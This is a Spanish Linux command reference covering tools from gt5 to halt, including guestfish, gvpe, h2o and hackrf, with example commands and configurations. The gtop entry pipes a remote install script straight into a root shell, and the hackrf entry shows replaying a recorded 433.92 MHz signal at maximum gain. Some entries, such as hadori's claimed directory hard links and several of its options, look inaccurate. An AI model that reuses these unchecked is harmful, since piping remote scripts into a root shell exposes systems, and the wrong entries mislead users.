[Graphical Tree 5]. Proporciona un listado del uso del disco duro y se puede navegar por él. El programa muestra lo que ha sucedido desde la última ejecución y muestra el tamaño del directorio y el porcentaje total. "q" para salir
$ gt5 /home/user (analiza el directorio y muestra el uso con el navegador)
$ gt5 /home/user/ --debug (genera archivo HTML en /tmp/gt5XXXXXXX/gt5.html y no ejecuta el navegador)
$ gt5 /home/user/ --discard (lo muestra en pantalla sin guardar)


gthd
Es un demonio activado por DBus que proporciona información sobre zonas térmicas, celdas de enfriamiento y puntos de calientes. Este paquete contiene el demonio y el ejecutable gthcli. Primero lanzar el demonio:
$ gthd
Y despues comprobar la información:
$ gthcli


gtop
Herramienta de monitoreo usando la terminal. Muestra información del rendimiento del sistema, uso del disco, memoria, CPU y red y muestra los porcentajes. (<https://github.com/aksakalli/gtop>)
Instalación:
	# curl -sL https://deb.nodesource.com/setup_8.x | bash -
	# apt-get install -y nodejs
	# npm install gtop -g
$ gtop (lanzar la herramienta)
Algunas teclas que se pueden usar:
    p (ordenar por PID)
    c (Por uso de CPU)
    m (Por uso de memoria)
    flechas aArriba/abajo (navegar por los procesos en ejecución)


getopts
Comando interno de bash [builtin] que sirve para analizar parámetros posicionales y opciones dentro de scripts.
1.-
Ejemplo de opciones simples
$ nano ejemplo1.sh
        #!/bin/bash
        #
        while getopts "ab" opt; do
          case $opt in
            a) echo "Opción -a detectada" ;;
            b) echo "Opción -b detectada" ;;
            \?) echo "Opción inválida: -$OPTARG" ;;
          esac
        done
$ chmod +x ejemplo1.sh
$ ./ejemplo1.sh -a -b (ejecutar)
        Opción -a detectada
        Opción -b detectada
2.-
Ejemplo con argumentos para opciones
$ nano ejemplo2.sh
        #!/bin/bash
        #
        while getopts "f:o:" opt; do
          case $opt in
            f) echo "Archivo: $OPTARG" ;;
            o) echo "Salida: $OPTARG" ;;
            \?) echo "Uso: $0 [-f archivo] [-o salida]" ;;
          esac
        done
f: --> significa que -f necesita un argumento.
OPTARG --> contiene el argumento de la opción actual.
$ chmod +x ejemplo2.sh
$ ./ejemplo2.sh -f datos.txt -o resultado.txt (ejecutar)
        Archivo: datos.txt
        Salida: resultado.txt
3.-
Ejemplo combinando opciones y argumentos libres
$ nano ejemplo3.sh
        #!/bin/bash
        #
        while getopts "u:p:" opt; do
          case $opt in
            u) echo "Usuario: $OPTARG" ;;
            p) echo "Puerto: $OPTARG" ;;
          esac
        done
        #
        # Desplazamos los parámetros para acceder a los argumentos libres
        shift $((OPTIND - 1))
        #
        echo "Archivos a procesar: $@"
$OPTIND --> Índice del siguiente argumento a procesar. Sirve para saber dónde acaban las opciones y empiezan parámetros "libres".
$ chmod +x ejemplo3.sh
$ ./ejemplo3.sh -u admin -p 8080 archivo1.txt archivo2.txt (ejecutar)
        Usuario: admin
        Puerto: 8080
        Archivos a procesar: archivo1.txt archivo2.txt


gtypist
Programa para aprender mecanografia en ncurses.


guake
Emulador de terminal emergente. Una vez iniciado el servicio colocándola en la aplicaciones de inicio o con:
$ guake
La terminal aparecerá o desaparecerá pulsando la tecla F12
$ guake -p (arranca las preferencias. En algunas distros ha de lanzarse desde el propio guake)
Para una personalización más exhaustiva:
# nano /usr/lib/guake/guake.py (En Arch: nano /usr/bin/guake)
width = 80 (Modificar archura, por defecto 100% de la pantalla)
if halignment == ALIGN_CENTER: (Centrada)
1.-
Para guardar la configuración:
$ guake --save-preferences=myprefs.cfg
y restaurarla:
$ guake --restore-preferences=myprefs.cfg
Preferible colocar myprefs.cfg en ~/.config/guake/


guake-indicator
permite administrar comandos personalizados. guake-indicator construye el menú de acuerdo con el archivo XML ~/.guake.indicator/guake-indicator.xml, si este archivo de configuración no existe, se creará uno predeterminado. Aunque guake-indicator tiene un editor de menú incorporado, se puede personalizar este archivo según necesidades con un editor de texto como base para agregar nuevas entradas. Los campos se explican por sí mismos, sin embargo, daré una pequeña descripción de cada uno:
        menu_name (nombre que aparecerá en el propio indicador)
        tab_name (nombre de la pestaña de la terminal de guake una vez que se abre)
        command_after_login (comando para enviar a Guake a través de la interfaz DBUS)
        dont_show_guake (Si se establece en yes, guake-indicator no pedirá que muestre su ventana principal)


guake-toggle
Alternar la visibilidad de guake. Con este comando se puede ocultar/mostrar guake-terminal.
$ guake-toggle


gucharmap
Permite navegar a través de todos los caracteres y categorías Unicode disponibles para las fuentes instaladas y examinar sus propiedades detalladas. Abre en mapa de caracteres en pantalla gráfica.
$ gucharmap
$ gucharmap --font 'Purisa 20'


guestfsd
Daemon para acceder a la máquina virtual invitada sin necesidad de arrancar la VM. El demonio guestfsd se ejecuta dentro de un pequeño "appliance" Linux que arranca libguestfs, y se comunica con la biblioteca principal del host a través de un canal especial, normalmente usando el puerto serie Virtio permitiendo así operaciones como listar, copiar, modificar archivos, inspeccionar particiones, etc, dentro de la imagen de disco de la VM. Los usuarios finales no suelen ejecutar guestfsd directamente. Normalmente, es la propia herramienta libguestfs, por ejemplo, guestfish, guestmount, virt-customize, etc. la que arranca el appliance y, dentro de él, ejecuta automáticamente guestfsd.
$ guestfsd (inicia el demonio en modo normal, esperando órdenes de la biblioteca libguestfs a través del canal por defecto)
$ guestfsd -v -r (inicia el demonio en modo "live", operando sobre el sistema de archivos raíz real en vez de sobre /sysroot y en modo verbose)
Nota.- Virtio-serial es un mecanismo de transporte para la comunicación entre el espacio de usuario del host y el de la maquina virtual, lo que permite, por ejemplo, que la copia y pegado del portapapeles funcione sin problemas tanto en el host como en el invitado, bloquear la pantalla del invitado si se cierra la sesión VNC, etc


guestmount
Utilidad para montar y desmontar sistemas de archivos invitados basada en FUSE [Filesystem in USErspace] sin necesidad de arrancarlas.
$ guestmount -a /var/lib/libvirt/images/debian11.qcow2 -i /mnt/guest (montar un disco QCOW2 [KVM/QEMU])
$ guestmount -a windows.vmdk -i --ro /mnt/guest (montar con solo lectura)
$ guestmount -a disk.raw -m /dev/sda1 /mnt/guest (monta solo la primera partición [/dev/sda1] del disco)
$ guestmount -a /dev/sdb -i /mnt/guest (montar un disco físico desde una máquina virtual)
$ guestmount --filesystem NTFS -a /dev/sdb -i /mnt/guest (para discos Windows, puede ser necesario especificar el sistema de archivos)
$ guestunmount /mnt/guest (desmontar de manera segura similar a fusermount -u)
Nota.- No usar "umount" directamente, ya que puede causar corrupción. guestunmount asegura una liberación limpia.
1.-
Un caso práctico para recuperar archivos de una VM corrupta:
$ guestmount -a centos8.qcow2 -i /mnt/guest
$ nano /mnt/guest/etc/fstab (modificar /etc/fstab)
$ guestunmount /mnt/guest (desmontar)


gunzip
Descomprime archivos gz comprimidos con gzip.
$ gunzip archivo.txt.gz


guessnet
Herramienta de detección de redes no agresiva para usar cuando se mueve una máquina entre redes que no necesariamente proporcionan DHCP. Al hacer ifup eth0, guessnet verificara si eth0 tiene que activarse como hogar o oficina. Para ello utiliza la información almacenada en las definiciones de las interfaces lógicas. En el archivo /etc/network/interfaces han de constar los datos de las redes.
# nano /etc/network/interfaces
auto eth0
mapping eth0
        script guessnet-ifupdown
        map timeout: 10
        map default: none
iface hogar inet static
        address 192.168.1.16
        netmask 255.255.255.0
        gateway 192.168.1.1
        test1 peer address 192.168.1.1 mac 00:11:22:33:44:55
        test2 peer address 192.168.1.2 mac 00:55:44:33:22:11
iface oficina inet static
	address 192.168.0.45
	netmask 255.255.255.0
	gateway 192.168.0.254
	test1 peer address 192.168.0.254 mac 00:55:66:77:88:99
	test2 peer address 192.168.0.1   mac 00:99:88:77:66:55
# default dhcp for none
        iface none inet dhcp


guestfish
Herramienta del proyecto libguestfs que permite examinar y modificar sistemas de archivos de máquinas virtuales [VMs] o imágenes de disco sin tener que arrancar la máquina virtual. Permite "montar" virtualmente el disco invitado y acceder a sus archivos directamente desde el sistema anfitrión, de forma segura y controlada.
$ guestfish --rw -a mi_maquina_virtual.qcow2 (para explorar y modificar [rw] una imagen de disco entrando en él)
        ><fs> run (inicia el "proceso invitado" y permite a guestfish interactuar con el sistema de archivos)
        ><fs> list-filesystems  (lista los sistemas de archivos detectados en la imagen)
        ><fs> mount /dev/vg_guest/lv_root /  (monta la partición raíz en el "root" virtual de guestfish no el el host anfitrion)
        ><fs> ls /etc  (lista el contenido del directorio /etc dentro de la VM)
        ><fs> cat /etc/fstab (muestra el contenido del archivo /etc/fstab de la VM)
        ><fs> edit /etc/resolv.conf (abre el archivo en el host y permite modificarlo y lo guarda de nuevo en la imagen)
        ><fs> upload /home/mi_usuario/archivo_local.txt /home/usuario_vm/nuevo_archivo.txt (copia un archivo desde el host a la VM)
        ><fs> download /etc/nginx/nginx.conf /tmp/nginx.conf_backup (copia un archivo desde la VM al host
        ><fs> rm /etc/udev/rules.d/70-persistent-net.rules (elimina un archivo en la VM)
        ><fs> exit (sale de guestfish)
$ guestfish --rw -a mi_maquina_virtual.qcow2 : run : mount /dev/vg_guest/lv_root / : write /etc/resolv.conf "nameserver 8.8.8.8" (ejecutar varios comandos sin entrar en el shell interactivo)
$ guestfish --ro -a mi_maquina_virtual.qcow2 -i cat /etc/group (inspeccionar la imagen, encontrar las particiones y montarlas como lo haría una VM real)


guider
Herramienta de análisis del sistema en tiempo de ejecución. Ofrece la mayoría de las funciones necesarias para medir, analizar, probar y verificar el rendimiento del sistema.
# guider top (abre la interfaz de análisis)
# guider record (iniciará la grabación de datos de rendimiento)
# guider -s mi_analisis.dat (guardar la salida en un archivo específico)
# guider top -g 12345 (monitorear un PID especifico)
# guider -i mi_analisis.dat (leer y mostrar el informe del archivo)
# guider top -i 2 (especificar un intervalo para la actualización de la pantalla en segundos)
# guider top -a (obtener la máxima cantidad de información sobre el uso de recursos)


guilt
[Git User's Interface to Linux Team]. es una colección de scripts de Bash que busca replicar la funcionalidad y la interfaz de las "colas de Mercurial" [Mercurial Queues o MQ] dentro del ecosistema de Git. La idea principal es gestionar parches como una serie o pila, en lugar de commits individuales en la historia principal del repositorio. Toda la información se almacena en texto plano: un archivo de serie y los parches, uno por archivo.
$ guilt init (estando en el directorio del repositorio GIT lo inicializa)
$ guilt new mi_nueva_caracteristica (crear un nuevo parche para una característica y la situa en la parte superior de la pila)
$ guilt refresh (después de realizar cambios, refrescar el parche)
$ guilt series (ver el estado de los parches)
$ guilt applied (solo mostraría la lista de los parches que están actualmente aplicados)
$ guilt pop (deshace la aplicación del parche superior de la serie)
$ guilt push (aplica el siguiente parche de la serie a tu directorio de trabajo)
$ guilt pop -a (desaplicar todos los parches)
$ guilt push -a` (aplicar todos los parches)


guncat
Herramienta que se utiliza para concatenar archivos mientras descifra secciones cifradas con PGP [Pretty Good Privacy]. Funciona de manera similar al comando cat [ver], pero con la capacidad adicional de manejar secciones parcialmente cifradas de los archivos procesados.
$ guncat archivo.txt.pgp (descifrará las secciones cifradas y mostrará el contenido en la salida estándar)
$ guncat archivo1.txt.pgp archivo2.txt.pgp (concatenará el contenido de los dos archivos, descifrando las secciones cifradas en el proceso)
$ guncat archivo.txt.pgp > salida.txt (descifrará archivo.txt.pgp y guardará el resultado en salida.txt)
$ guncat archivo.txt.pgp | grep "patrón" (descifrará archivo.txt.pgp y pasará el contenido a grep para buscar un patrón específico)


gupnp-dlna-tools
conjunto de herramientas que trabajan con perfiles DLNA [Digital Living Network Alliance], principalmente para identificar y manipular archivos multimedia según los estándares DLNA. Estas herramientas son parte del framework GUPnP, que implementa el protocolo UPnP [Universal Plug and Play] para dispositivos en red.
$ gupnp-dlna-info video.mp4 (examina un archivo multimedia y muestra información sobre su perfil DLNA)
$ gupnp-dlna-info cancion.mp3 (analizar un archivo de audio)
$ gupnp-dlna-info -v imagen.jpg (analizar una imagen y nistrar más información)
$ gupnp-dlna-ls-profiles (muestra todos los perfiles DLNA disponibles en el sistema)


gv
Visor de ps y pdf.
$ gv --grayscale --infoErrors --center out.pdf (en gris, sin mostrar los errores y centrado)


gvfs
[Gnome Virtual File System]. Es una capa de abstracción de sistema de archivos que permite acceder a ubicaciones remotas como servidores FTP, SMB, WebDAV, Google Drive, etc. como si fueran sistemas de archivos locales, sin necesidad de montar nada explícitamente en /mnt o /media. gvfs en lugar de montar sistemas de archivos a nivel de kernel como el comando mount tradicional, lo hace en el espacio de usuario y cada "montaje" es manejado por un proceso independiente por ejemplo, gvfsd-ftp, gvfsd-smb, etc. Las aplicaciones GIO-aware como Nautilus, GNOME Terminal, o cualquier app GTK moderna, pueden acceder directamente a estos recursos.
$ gio list (lista archivos)
$ gio open musica.wav (abre el archivo con la aplicación predeterminada)
$ gio list ftp://usuario@servidor.com (listar archivos en un recurso FTP)
$ gio copy archivo.txt davs://usuario@webdav.servidor.com/archivo.txt (copiar un archivo local a un recurso WebDAV=
$ gio mount smb://usuario@servidor/red (montar una unidad de red SMB)
$ gio info google-drive://miemail@gmail.com/archivo.txt (ver información de un archivo en Google Drive)
$ gio trash documento.txt (mandar un archivo a la papelera)
Nota.- Al usar backends [ftp://, smb://, mtp://, etc.] de GVfs, estos se "montan" en: /run/user/$(id -u)/gvfs/


gvpe
[GNU Virtual Private Ethernet]. Herramienta diseñada para crear una Ethernet virtual segura y cifrada estableciendo túneles cifrados de host a host entre los "nodos" [máquinas o servidores] que forman parte de la red virtual, ideal para conectar sucursales de una empresa o diferentes redes remotas como si estuvieran en la misma red local. A diferencia de algunas soluciones VPN punto a punto, gvpe está diseñado para crear una verdadera red multipunto, lo que significa que cualquier nodo puede comunicarse directamente con cualquier otro nodo de la red virtual, sin necesidad de pasar por un nodo central. Puede usar diversos protocolos para el tunelado: IP sin procesar, UDP, TCP, conexión proxy HTTPS, ICMP y DNS.
Configurar gvpe requiere de un archivo de configuración para cada nodo, donde se especifican las direcciones de los otros nodos, las claves de cifrado y los parámetros de red. No es un comando que se ejecute directamente en la línea de comandos con argumentos simples para establecer una conexión. En su lugar, se inicia un demonio gvpe que lee un archivo de configuración.
Cada nodo necesita un par de claves públicas/privadas.
$ gvpe --gen-key > key_oficina_a.priv
$ gvpe --gen-pub key_oficina_a.priv >> key_oficina_a.pub
Repetir este proceso para la oficina [b, c, d...].
Cada nodo ha de tener la clave pública de los otros nodos con los que se va a comunicar. Estas claves se copiarían en el archivo de configuración de cada nodo.
Ejemplo de configuración para oficina a y oficina b:
# nano /etc/gvpe/gvpe_oficina_a.conf
        # Nombre del nodo local
        name = oficina_a
        # La interfaz virtual que gvpe creará, ej. ethgvpe0
        ifname = ethgvpe0
        # Dirección IP que tendrá la interfaz virtual en esta oficina
        ip = 10.0.0.1/24
        # Puerto TCP/UDP para las conexiones entrantes, si se desea que este nodo actúe como servidor
        # Si se pone a 0, este nodo solo iniciará conexiones, no las aceptará directamente.
        port = 12345
        # Clave privada de este nodo
        private_key_file = /etc/gvpe/key_oficina_a.priv
        # Otros parámetros (opcionales)
        # log_file = /var/log/gvpe_oficina_a.log
        # mtu = 1400
        # Definición de los nodos remotos
        [node oficina_b]
        # Dirección IP pública o nombre de host de la Oficina B
        host = direccion_ip_publica_oficina_b
        # Puerto en el que la Oficina B escucha
        port = 12345
        # Clave pública de la Oficina B
        public_key = "TU_CLAVE_PUBLICA_DE_OFICINA_B_AQUI"
        # La dirección IP virtual de la Oficina B dentro de la red gvpe
        ip = 10.0.0.2/24
Para oficina b sería similar, pero con la ip local 10.0.0.2/24 y el host apuntando a la dirección pública de la Oficina a, junto con la clave pública de la Oficina a.
# nano /etc/gvpe/gvpe_oficina_b.conf
        name = oficina_b
        ifname = ethgvpe0
        ip = 10.0.0.2/24
        port = 12345
        private_key_file = /etc/gvpe/key_oficina_b.priv
        [node oficina_a]
        host = direccion_ip_publica_oficina_a
        port = 12345
        public_key = "TU_CLAVE_PUBLICA_DE_OFICINA_A_AQUI"
        ip = 10.0.0.1/24
Una vez configurado, gvpe se ejecutaría en segundo plano como un demonio:
$ gvpe -c /etc/gvpe/gvpe_oficina_a.conf (en la oficina a)
$ gvpe -c /etc/gvpe/gvpe_oficina_b.conf (en la oficina b)
Para que el tráfico de la red local de cada oficina use el túnel gvpe, sería necesario añadir rutas en los servidores de pasarela. Por ejemplo, en el servidor de la Oficina A, si la red local de la Oficina B es 192.168.2.0/24:
# ip route add 192.168.2.0/24 via 10.0.0.2 dev ethgvpe0 (en a)
# ip route add 192.168.1.0/24 via 10.0.0.1 dev ethgvpe0 (en b)


gwenhywfar-tools
Biblioteca de abstracción de plataforma utilizada principalmente en aplicaciones financieras como AqBanking y KMyMoney. Gwenhywfar proporciona módulos reutilizables para tareas como acceso a archivos de configuración, análisis XML, comunicación entre procesos, etc.
$ mklistdoc archivo.typ (define estructuras de datos, como Client, Address, etc)
$ gct-tool list (muestra los certificados actualmente cargados)
$ gct-tool import mi_certificado.pem (importa un certificado para que Gwenhywfar lo utilice)
$ xmlmerge configuracion_original.xml configuracion_usuario.xml > configuracion_final.xml (combina configuraciones personalizadas del usuario con las predeterminadas del sistema)
$ typemaker archivo.typ (generador de código que toma archivos `.typ` y produce estructuras C completas, funciones de acceso, serialización, etc)


gwhois
Herramienta Cliente/Servidor para consultar información WHOIS de dominios, direcciones IP y AS [Sistemas Autónomos]. A diferencia del comando whois tradicional, tiene la capacidad de determinar automáticamente el servidor WHOIS correcto para consultar, incluso para TLDs [dominios de nivel superior] menos comunes o rangos de IP.
$ gwhois -v ejemplo.com (busca información WHOIS del dominio, detectando automáticamente el servidor correc y en modo verbose)
$ gwhois ejemplo.io (gwhois sabe que los dominios .io deben consultarse en whois.nic.io)
$ gwhois 192.0.2.1 (detecta el rango de la IP y consulta el servidor WHOIS correspondiente)
$ gwhois AS12345 (devuelve información sobre el Sistema Autónomo con número 12345)
$ gwhois -s whois.ripe.net 193.0.0.0 (ignora la detección automática y consulta directamente en whois.ripe.net)
1.-
Para usar como servidor para clientes WHOIS tradicionales
# nano /etc/inetd.conf
Añadir la linea:
        whois stream tcp nowait nobody /usr/bin/gwhois gwhois -s


gxmessage
Dejar mensajes en la pantalla
$ gxmessage -center -fg red -bg black "No cierren la terminal"
-fg (Color de fuente)
-bg (Color de fondo)
-center (En el centro de la pantalla)
-iconic (Minimizado en el panel)
-nearmouse (Se abre donde está el cursor)
-entry (Con un cuadro de dialogo pera entrar una respuesta)


gzexe
Comprime ficheros ejecutables que al ser invocados se autodescomprimen para ejecutarse. Esta utilidad sólo se aplica en equipos con discos muy pequeños.
# gzexe /bin/ls
Creará dos archivos: "/bin/ls" y "/bin/ls~". El original es el ls~ que podrá borrarse una vez comprobado que lanzando "ls" en consola, funciona correctamente.


gzip
(gz). Comprime un fichero substituyendolo por un .gz (ni empaqueta ni comprime directorios). Consta de varios ejecutables: gunzip (descomprimir .gz), gzexe (codifica porcentajes de un ejecutable sin modificar el nombre y se ejecutan igualmente), zcat (muestra el contenido de un .gz por la pantalla), zcmp (ejecuta cmp en comprimidos .gz), zdiff (ejecuta diff entre un archivo .gz y el mismo descomprimido si existe en existe en el directorio), zegrep (ejecuta egrep en archivos .gz), zfgrep (ejecuta fgrep en archivos .gz), zforce (fuerza una extensión .gz para que gzip no los comprima de nuevo. Esto puede ser útil cuando los nombres de los archivos se truncaron durante una transferencia de archivos), zgrep (ejecuta grep en archivos .gz), zless (ejecuta less en archivos .gz), zmore (muestra el contenido de un .gz por la pantalla), znew (recomprime archivos de formato compress [.Z] a formato gzip [.gz])
$ gzip -r fichero (Comprimir)
$ gzip -9 archivo (Con compresión máxima)
$ gzip -d fichero.gz (Descomprimir)
$ gzip -c fichero.gz (Ver contenido)
$ gzexe datos.sh (si lo abrimos con un editor veremos parte codificada pero podrá ejecutarse normalmente con ./datos.sh)


gzrt
[GZip Recovery Toolkit]. Herramienta diseñada para intentar recuperar datos de archivos .gz dañados. Cuando un archivo comprimido con gzip se corrompe, por ejemplo, debido a una transferencia incorrecta o sectores defectuosos en el disco, gzrecover puede recuperar la mayor cantidad posible de datos intactos omitiendo las secciones corruptas.
$ gzrecover -v backup.tar.gz (generará un archivo llamado backup.tar.recovered en modo verbose)
$ gzrecover -s -o archivo_recuperado.tar backup.tar.gz (guardar los datos recuperados en un archivo específico y creando archivos separados para cada segmento recuperado)


gztool
indexa archivos comprimidos con gzip, lo que permite acceder a los datos sin necesidad de descomprimir todo el archivo. Puede indexar archivos existentes, comprimir, descomprimir y crear índices optimizados sobre la marcha"
$ gztool -c archivo.txt > archivo.gz (comprimir un archivo)
$ gztool -i archivo.gz (creará el archivo de índice)
$ gztool -I archivo.txt archivo.gz (comprimir y crear índice simultáneamente)
$ gztool -b 1000 -e 2000 archivo.gz (extraer solo del byts 1000 al 2000)
$ gztool -t archivo.gz (verificar la integridad del archivo comprimido)
$ gztool -d archivo.gz > archivo.txt (descomprimir usando el índice)
$ gztool -s 1 archivo.gz  # Crea un índice con muestreo cada 1MB (crear un índice optimizado para mejor rendimiento en acceso aleatorio)


h2o
Es un servidor HTTP diseñado para ofrecer respuestas rápidas y un uso eficiente de CPU y memoria, especialmente optimizado para HTTP/2 y HTTP/3, implementa características modernas como priorización de contenido, server push, soporte para TLS avanzado y puede servir archivos estáticos, actuar como proxy inverso, o funcionar con FastCGI para aplicaciones dinámicas.
$ h2o -c /etc/h2o/h2o.conf (arrancar H2O indicando el archivo de configuración que define hosts, rutas, certificados SSL, etc. Permanecerá activo hasta pulsar Ctrl+c)
Ejemplo de archivo de configuración básico
# nano /etc/h2o/h2o.conf
        listen:
          port: 443
          ssl:
            certificate-file: /etc/ssl/certs/mi_cert.crt
            key-file: /etc/ssl/private/mi_key.key
        hosts:
          "mi-dominio.com":
            paths:
              "/":
                file.dir: /var/www/html
                http2-push-preload: ON
Este archivo indica a H2O que escuche en el puerto 443 [HTTPS], use los certificados especificados y sirva archivos estáticos desde /var/www/html para el dominio indicado y si los archivos HTML contienen enlaces con rel=preload, H2O los enviará automáticamente usando Server Push.
# systemctl enable h2o.service (arrancar H2O como servicio)
# systemctl start h2o.service


h5ar
Herramienta para trabajar con archivos HDF5 [Hierarchical Data Format versión 5], diseñados para almacenar y organizar grandes cantidades de datos numéricos y heterogéneos. Es ampliamente utilizado en campos científicos como la física, la química, la geología y la bioinformáticas.
Ejemplo de uso
$ ls dir_h5ar
        documento1.txt
        imagen.png
        datos.csv
        informe.pdf
$ h5ar -c mi_archivo.h5 documento1.txt imagen.png datos.csv (crear un archivo HDF5 llamado mi_archivo.h5 y dentro de él, almacenará documento1.txt, imagen.png y datos.csv)
$ h5ar -t mi_archivo.h5 (ver qué archivos contiene)
$ h5ar -u mi_archivo.h5 informe.pdf (añadir archivos a un archivo HDF5 existente)
$ h5ar -x mi_archivo.h5 (extraerá todos los archivos)
$ h5ar -x mi_archivo.h5 documento1.txt imagen.png (extraer sólo el archivo especificado)
$ h5ar -x mi_archivo.h5 -C otro_dir/ (que los archivos extraídos se guarden en un directorio diferente)


hachoir
Framework de Python que se utiliza para representar un archivo binario como un árbol de objetos de Python. Cada objeto tiene un tipo, un valor, una dirección, etc. El objetivo es conocer el significado de cada bit de un archivo. Incluye las herramientas hachoir-grep, hachoir-metadata, hachoir-strip, hachoir-urwid y hachoir-wx
$ hachoir-metadata archivo.jpg (extrae metadatos)
$ hachoir-grep GPS video.mp4 (buscar valores binarios específicos o patrones dentro del árbol del archivo)
$ hachoir-strip documento.pdf documento_limpio.pdf (crea una nueva copia del archivo, eliminando metadatos sensibles)
$ hachoir-urwid archivo.ext (interfaz interactiva que permite navegar por la estructura binaria del archivo)
$ hachoir-wx archivo.ext (interfaz gráfica [GUI] para explorar visualmente la estructura del archivo)
Nota.- Esta utilidad puede no estar disponible en algunas instalaciones o puede requerir dependencias gráficas específicas como python3-wxgtk.


hachoir-metadata
Ver entrada python-hachoir-metadata


hackage-tracker
Herramienta utilizada para rastrear y comparar las versiones de paquetes Haskell disponibles en Hackage, el repositorio principal de paquetes Haskell con las versiones empaquetadas en Debian.
$ hackage-tracker (descarga los metadatos de Hackage y Debian, compara las versiones y genera un archivo HTML en el directorio de salida predeterminado)
$ hackage-tracker --output-dir=/tmp/hackage-report (especificar un directorio de salida)
$ hackage-tracker --update (descarga la información más reciente de Hackage y Debian sin generar el informe HTML)
$ hackage-tracker --package=yesod --package=lens (compara solo los paquetes `yesod` y `lens` entre Hackage y Debian)
$ hackage-tracker --force (ignora la caché local y vuelve a descargar toda la información antes de generar el informe)


hackrf
Es una radio definida por software [SDR] que puede recibir y transmitir señales de radio en un rango de frecuencia extremadamente amplio [30 MHz a 6 GHz] con un ancho de banda considerable [20 MHz]. Es un dispositivo USB de alta velocidad alimentado por el bus USB. Contiene un conjunto de utilidades: hackrf_clock, hackrf_cpldjtag, hackrf_debug, hackrf_info, hackrf_operacake, hackrf_spiflash, hackrf_sweep y hackrf_transfer
$ hackrf_info (verificar la conexión. Proporciona información sobre el firmware, versión del hardware y otros detalles importantes del dispositivo)
$ hackrf_transfer -r fm_radio.raw -f 98.7e6 -s 20e6 -n 200e6 # 20M muestras/seg * 10 seg (grabar una señal de radio FM, por ejemplo, a 98.7 MHz durante 10 segundos)
$ hackrf_transfer -t signal.raw -f 433.92e6 -s 10e6 -x 47 # Ganancia TX máxima (transmitir una señal previamente grabada, por ejemplo, signal.raw a 433.92 MHz)
$ hackrf_transfer -r /dev/stdout -f 100e6 -s 10e6 | sox -t raw -e signed -b 16 -c 1 -r 10e6 - radio_audio.wav (recibir datos y enviarlos directamente a stdout)
$ hackrf_sweep -f 800e6:900e6 (mostrará una serie de valores de potencia para diferentes frecuencias dentro del rango especificado)
$ hackrf_sweep -f 2.4e9:2.5e9 -w 10e6 (escanear el espectro de 2.4 GHz a 2.5 GHz con un ancho de banda de 10 MHz por barrido)
$ hackrf_clock --external-clock-source (ajustar la frecuencia del reloj)
$ hackrf_cpldjtag -x firmware/cpld/sgpio_if/default.xsvf (después de unos segundos, tres LED deberían empezar a parpadear lo que indica que el CPLD [Complex Programmable Logic Device] se ha programado correctamente. Reiniciar el dispositivo HackRF.)
$ hackrf_spiflash -r firmware_backup.bin (leer el firmware actual y guardarlo en un archivo)
$ hackrf_spiflash -w new_firmware.bin (escribir un nuevo firmware desde un archivo)
$ hackrf_debug --help (ver opciones disponibles para depuración)
$ hackrf_operacake --help ( ver las opciones para interactuar con Operacake)
$ hackrf_spiflash -e (borrará el firmware y el HackRF no funcionará hasta que se flashee un nuevo firmware)


hackrf-firmware
Firmware para dispositivos HackRF. El hardware HackRF necesita firmware para funcionar. El firmware se compila con arm-none-eabi-gcc. Este paquete contiene varias imágenes de firmware que pueden programarse en el hardware HackRF mediante el comando hackrf_spiflash -w [ver hackrt] o dfu-util [ver]. Las imágenes de firmware se instalan en /usr/share/hackrf/firmware/


hadori
Esta herramienta podría parecer otra herramienta de enlaces duros a archivos idénticos, pero es la única que solo memoriza un nombre de archivo por inodo
$ hadori original_file new_link (crea un nuevo enlace duro llamado "new_link" que apunta al archivo "original_file")
$ hadori --list /ruta/del/archivo (muestra todos los enlaces duros existentes para el archivo especificado)
$ hadori -d /ruta/del/enlace (eliminación de enlaces duros)
$ hadori /ruta/del/directorio1 /ruta/del/directorio2 (crea un enlace duro entre dos directorios, permitiendo acceder a los archivos de uno desde el otro)


hal-device
Crea, suprime y muestra dispositivos
$ hal-device -a dispositivo  (añadir)
$ hal-device -r dispositivo   (borrar)
$ hal-device | grep volume.label  (mostrar etiquetas de todos los volumenes)


halibut
Sistema de formato de texto diseñado principalmente para la redacción de documentación de software. Se centra en la capacidad de generar una amplia variedad de formatos de salida [Text, HTML, WinHelp [Ayuda de Windows], Man Pages [páginas de manual], Info de GNU, PostScript o PDF] desde una única fuente. La idea central de Halibut es escribir el contenido una sola vez en un formato de texto plano y simple, y luego se encarga de convertirlo en el formato final que se necesite, ya sea visualización en web, como manual o para imprimir.
Halibut utiliza un conjunto de directivas o comandos de formato dentro del archivo fuente para estructurar el contenido. Algunas de las más comunes incluyen:
        \chapter{Título del Capítulo} --> Define un nuevo capítulo.
        \section{Título de la Sección} --> Define una nueva sección.
        \subsection{Título de la Subsección}--> Define una nueva subsección.
        \paragraph{Título del Párrafo} --> Define un nuevo párrafo.
        \item{Texto del Ítem} --> Crea un elemento en una lista.
        \code{Código} --> Formatea texto como código.
        \url{URL} --> Inserta una URL.
        \li{Texto de la lista} --> Similar a `\item`, para elementos de lista.
        \i{Texto en cursiva} --> Formatea texto en cursiva.
        \b{Texto en negrita} --> Formatea texto en negrita.
1.-
Ejemplo de uso con un archivo fuente simple
$ nano manual.txt
\chapter{Mi Primer Manual con Halibut}
 Este es un ejemplo sencillo de un manual escrito usando Halibut.
\section{Introducción}
 Bienvenidos a este pequeño manual. Aquí exploraremos las capacidades básicas de Halibut.
\paragraph{Un Poco de Historia}
 Halibut fue creado por Simon Tatham, el mismo autor de la famosa herramienta PuTTY.
 Su diseño se centra en la simplicidad y la eficiencia.
\section{Características Principales}
 Halibut ofrece varias características útiles:
\li Generación de múltiples formatos de salida.
\li Sintaxis de marcado simple y fácil de aprender.
\li Soporte para referencias cruzadas y tablas de contenido.
\subsection{Ejemplo de Código}
 Aquí tienes un ejemplo de cómo se puede formatear código:
\code{
#include <stdio.h>
int main() {
    printf("¡Hola, Halibut!\n");
    return 0;
}
}
\section{Enlaces Útiles}
 Puedes encontrar más información sobre Halibut en su sitio web oficial:
\url{https://www.chiark.greenend.org.uk/~sgtatham/halibut/}
\end{document}
$ halibut --text manual.txt > manual.txt.out (creará un archivo manual.txt.out con el contenido formateado para texto plano)
$ halibut --html manual.txt > manual.html (generará un archivo manual.html)
$ halibut --man manual.txt > manual.man (generar una página de manual)
$ halibut --ps manual.txt > manual.ps (genera un .ps que podrá convertirse en .pdf con ps2pdf [ver])


halt
[poweroff, reboot]. Se puede utilizar para detener, apagar o reiniciar la máquina. Los tres  comandos tienen las mismas opciones.
$ halt --halt (Detener la máquina, independientemente de cuál de los tres comandos se invoque)
